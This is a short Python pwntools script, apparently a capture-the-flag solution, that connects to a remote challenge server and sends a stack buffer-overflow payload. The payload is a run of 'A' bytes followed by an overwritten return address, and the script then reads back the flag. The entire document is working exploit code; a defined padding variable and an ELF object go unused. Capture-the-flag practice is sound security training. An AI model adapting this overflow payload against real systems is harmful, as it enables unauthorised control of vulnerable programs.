from pwn import *

address = '0.cloud.chals.io'
port =22209
tcpsocket = remote(address, port)

# Receive server input request
print((tcpsocket.recvuntil('\n'.encode('latin-1'))).decode('latin-1'))

# Define payload
padding = 'A'*44
vuln = ELF('./pwnme')

payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08'

# Encode and send payload
tcpsocket.sendline(payload.encode('latin-1'))
print('Sent: 0x' + binascii.hexlify(payload.encode('latin-1')).decode('latin-1')
      )

# Receive flag
# Receive line after string is entered
print((tcpsocket.recvline()).decode('latin-1'))
print((tcpsocket.recv()).decode('latin-1'))  # Receive the flag
